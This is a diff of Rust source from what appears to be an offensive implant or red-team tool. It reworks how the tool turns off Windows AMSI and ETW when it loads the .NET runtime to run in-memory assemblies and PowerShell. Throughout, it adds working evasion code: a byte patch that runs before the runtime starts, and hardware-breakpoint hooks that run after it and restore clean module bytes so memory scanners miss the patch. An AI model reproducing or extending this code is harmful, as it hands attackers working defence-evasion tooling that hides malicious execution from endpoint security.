@@ -134,15 +134,14 @@ fn wide(text: &str) -> Vec<u16> {
     text.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
-/// Neutralizes the process instrumentation layers managed execution
-/// cares about. Prefers the hardware-breakpoint variant (ABR-T036:
-/// module bytes stay pristine for memory scanners) and falls back to
-/// the legacy byte patch (ABR-T024) when arming fails.
-fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
-    if crate::evasion::hwbp::ensure_armed().is_ok() {
-        notes.push("amsi=hwbp,etw=hwbp");
-        return;
-    }
+/// Pre-start phase of AMSI/ETW neutralization: the legacy byte patch
+/// (ABR-T024) BEFORE `CorBindToRuntimeEx`. The runtime initializes fine
+/// with the stubs already in place (they answer every scan/scan-write
+/// with "invalid argument"/"success"), but the same patch landing on a
+/// mid-initialized CLR breaks it (System.ArithmeticException inside the
+/// managed EventProvider — found live during the bench rerun), so the
+/// patch is the shield for the start and the breakpoints take over after.
+fn patch_for_clr_start(notes: &mut Vec<&'static str>) {
     match crate::evasion::patch::patch_amsi() {
         Ok(_) => notes.push("amsi=patched"),
         Err(_) => notes.push("amsi=unavailable"),
@@ -153,6 +152,27 @@ fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
         Ok(_) => notes.push("etw=patched"),
         Err(_) => notes.push("etw=unavailable"),
     }
+}
+
+/// Post-start phase: once the runtime is up, try the hardware-breakpoint
+/// variant (ABR-T036). On success the pre-start byte patch is undone —
+/// module bytes return to pristine for memory scanners — and the
+/// breakpoints retire the same two functions for the process lifetime.
+/// On failure (hypervisor-owned debug registers) the byte patch simply
+/// stays. `SetThreadContext` on the debug registers poisons a thread
+/// for a SUBSEQUENT runtime start, which is exactly why this runs after
+/// `Start()` and never before.
+fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
+    if crate::evasion::hwbp::ensure_armed().is_ok() {
+        if crate::evasion::patch::unpatch().is_ok() {
+            notes.push("amsi=hwbp,etw=hwbp");
+            return;
+        }
+        // Unpatch failed (page flip refused): keep the stubs and say so.
+        notes.push("hwbp=armed,patch-kept");
+    }
+    // Arming blocked (hypervisor-owned debug registers): the pre-start
+    // byte patch stays — already reported by patch_for_clr_start.
 }
 
 /// Hosts the CLR, runs `type_name.method_name(argument)` from `data`
@@ -178,8 +198,9 @@ pub fn exec_assembly(
         ));
     }
     let mut notes: Vec<&'static str> = Vec::new();
-    if patch_first {
-        suppress_amsi_etw(&mut notes);
+    let hwbp = crate::evasion::hwbp_requested();
+    if patch_first && !hwbp {
+        patch_for_clr_start(&mut notes);
     }
 
     // Random temp name: the disk flash is documented telemetry, but the
@@ -189,7 +210,14 @@ pub fn exec_assembly(
     std::fs::write(&path, data).map_err(|e| format!("temp write failed: {e}"))?;
     let path_text = path.to_string_lossy().into_owned();
 
-    let result = run_in_default_domain(&path_text, type_name, method_name, argument);
+    let result = run_in_default_domain(
+        &path_text,
+        type_name,
+        method_name,
+        argument,
+        (patch_first && hwbp).then_some(suppress_amsi_etw as SuppressHook),
+        &mut notes,
+    );
     // The CLR maps the assembly and keeps the file handle open without
     // sharing writes, so neither delete nor overwrite can land while it
     // lives. POSIX-style delete-on-close (NtSetInformationFile with
@@ -328,7 +356,9 @@ pub fn powershell_run(script: &str, bootstrap: &[u8]) -> Result<Vec<u8>, String>
         return Err("empty bootstrap".into());
     }
     let mut notes: Vec<&'static str> = Vec::new();
-    suppress_amsi_etw(&mut notes);
+    if !crate::evasion::hwbp_requested() {
+        patch_for_clr_start(&mut notes);
+    }
     let boot_tag: u32 = rand::random();
     let boot_path = std::env::temp_dir().join(format!("{boot_tag:08x}-ps.dll"));
     let out_tag: u32 = rand::random();
@@ -338,7 +368,14 @@ pub fn powershell_run(script: &str, bootstrap: &[u8]) -> Result<Vec<u8>, String>
     let out_text = out_path.to_string_lossy().into_owned();
     let argument = format!("{out_text}\n{script}");
 
-    let result = run_in_default_domain(&boot_text, "Boot", "Run", &argument);
+    let result = run_in_default_domain(
+        &boot_text,
+        "Boot",
+        "Run",
+        &argument,
+        crate::evasion::hwbp_requested().then_some(suppress_amsi_etw as SuppressHook),
+        &mut notes,
+    );
     let deleted = std::fs::remove_file(&boot_path).is_ok();
     let delete_marked = if deleted {
         false
@@ -358,11 +395,21 @@ pub fn powershell_run(script: &str, bootstrap: &[u8]) -> Result<Vec<u8>, String>
 
 /// The raw hosting chain; separated so the probe test can exercise each
 /// HRESULT individually.
+/// Suppression hook executed between CLR Start and the managed call:
+/// SetThreadContext on the debug registers poisons a thread for the
+/// SUBSEQUENT CorBindToRuntimeEx (E_FAIL, bisected live during the
+/// bench rerun), so AMSI/ETW neutralization — hardware breakpoints
+/// with the byte patch as fallback — must run after the runtime is up
+/// and before the engine starts calling AmsiScanBuffer/EtwEventWrite.
+type SuppressHook = fn(&mut Vec<&'static str>);
+
 fn run_in_default_domain(
     assembly_path: &str,
     type_name: &str,
     method_name: &str,
     argument: &str,
+    suppress: Option<SuppressHook>,
+    notes: &mut Vec<&'static str>,
 ) -> Result<(i32, u32), String> {
     unsafe {
         let create_addr = syscalls::export_address("mscoree.dll", "CLRCreateInstance")
@@ -432,6 +479,11 @@ fn run_in_default_domain(
             (host_vt.release)(runtime_host);
             (info_vt.release)(runtime_info);
             return Err(format!("CLR Start failed: {hr:#010x}"));
+        }
+
+        // Suppression lands here on purpose — see SuppressHook.
+        if let Some(hook) = suppress {
+            hook(notes);
         }
 
         let path = wide(assembly_path);
